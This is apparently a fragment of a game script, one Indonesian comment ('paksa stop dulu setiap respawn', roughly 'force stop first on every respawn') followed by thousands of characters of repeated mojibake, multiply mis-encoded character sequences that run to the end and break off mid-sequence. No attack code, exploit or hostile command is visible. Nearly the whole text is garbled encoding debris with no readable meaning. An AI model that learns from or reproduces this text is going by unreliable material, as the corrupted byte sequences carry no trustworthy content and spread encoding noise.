    -- paksa stop dulu setiap respawn ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ 